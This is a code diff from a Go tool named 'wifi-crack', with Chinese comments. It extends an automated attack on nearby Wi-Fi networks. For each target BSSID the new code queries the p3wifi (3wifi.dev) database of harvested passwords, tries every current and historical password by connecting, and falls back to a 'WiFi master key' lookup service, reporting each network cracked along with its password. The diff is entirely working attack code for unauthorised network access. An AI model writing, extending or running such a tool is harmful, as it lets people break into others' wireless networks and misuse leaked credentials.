@@ -15,6 +15,7 @@ import (
 	"wifi-crack/internal/dict"
 	"wifi-crack/internal/hashcrack"
 	"wifi-crack/internal/masterkey"
+	"wifi-crack/internal/p3wifi"
 	"wifi-crack/internal/scanner"
 )
 
@@ -686,24 +687,76 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 		fmt.Printf("\n  ━━ 目标 [%d/%d] %s (BSSID:%s CH:%d %ddBm %s) ━━\n",
 			ti+1, len(targets), t.SSID, t.BSSID, t.Channel, t.RSSI, t.Security)
 
-		// ── Phase 1: 万能钥匙API查询（秒级） ──
-		fmt.Println("  [Phase 1] 万能钥匙API查询...")
+		// ── Phase 1: 全球WiFi密码库查询（秒级） ──
+		// 优先用p3wifi（3wifi.dev全球开放数据库），万能钥匙作为备用
+		fmt.Println("  [Phase 1] 全球WiFi密码库查询（p3wifi + 万能钥匙）...")
 		if t.BSSID != "" {
-			pwd, err := masterkey.Query(t.SSID, t.BSSID)
-			if err == nil && pwd != "" {
-				fmt.Printf("    ✓ 万能钥匙命中: %s，验证连接...\n", pwd)
-				if scanner.TryConnect(t.SSID, pwd) {
-					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（万能钥匙）\n", t.SSID, pwd)
+			phase1Hit := false
+
+			// 1a. p3wifi全球密码库查询（无需认证，数据库数千万条记录）
+			fmt.Printf("    [1a] p3wifi数据库查询 BSSID=%s ...", t.BSSID)
+			pwd3, err3 := p3wifi.QueryByBSSID(t.BSSID)
+			if err3 == nil && pwd3 != "" {
+				fmt.Printf(" ✓ 命中! 密码=[%s]\n", pwd3)
+				fmt.Printf("    验证连接中...\n")
+				if scanner.TryConnect(t.SSID, pwd3) {
+					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（p3wifi全球密码库）\n", t.SSID, pwd3)
+					scanner.DisconnectWiFi()
+					successCount++
+					phase1Hit = true
+				} else {
+					fmt.Println("    ✗ p3wifi密码验证失败（可能已更换密码）")
+				}
+			} else if err3 != nil {
+				fmt.Printf(" 查询失败: %v\n", err3)
+			} else {
+				fmt.Printf(" 未收录\n")
+			}
+
+			// 如果p3wifi有完整记录（含多个历史密码），尝试所有
+			if !phase1Hit {
+				fullResults, _ := p3wifi.QueryFull(t.BSSID, "")
+				for _, r := range fullResults {
+					if r.Password == pwd3 {
+						continue // 已尝试过
+					}
+					fmt.Printf("    [1a] 尝试历史密码: %s ...", r.Password)
+					if scanner.TryConnect(t.SSID, r.Password) {
+						fmt.Printf(" ✓ 命中!\n")
+						fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（%s）\n", t.SSID, r.Password, r.Source)
+						scanner.DisconnectWiFi()
+						successCount++
+						phase1Hit = true
+						break
+					}
+					fmt.Printf(" ✗\n")
+					time.Sleep(200 * time.Millisecond)
+				}
+			}
+
+			if phase1Hit {
+				continue
+			}
+
+			// 1b. 万能钥匙备用查询（API可能已失效，优雅降级）
+			fmt.Printf("    [1b] 万能钥匙API查询...")
+			pwdMK, errMK := masterkey.Query(t.SSID, t.BSSID)
+			if errMK == nil && pwdMK != "" {
+				fmt.Printf(" ✓ 命中! 密码=[%s]\n", pwdMK)
+				if scanner.TryConnect(t.SSID, pwdMK) {
+					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（万能钥匙）\n", t.SSID, pwdMK)
 					scanner.DisconnectWiFi()
 					successCount++
 					continue
 				}
-				fmt.Println("    ✗ 万能钥匙密码验证失败，继续下一阶段")
+				fmt.Println("    ✗ 验证失败")
+			} else if errMK != nil {
+				fmt.Printf(" 不可用（%v）\n", errMK)
 			} else {
-				fmt.Println("    - 未收录")
+				fmt.Printf(" 未收录\n")
 			}
 		} else {
-			fmt.Println("    - BSSID为空，跳过")
+			fmt.Println("    - BSSID为空，跳过在线查询")
 		}
 
 		// ── Phase 2: CoreWLAN快速验证TOP密码（秒级） ──
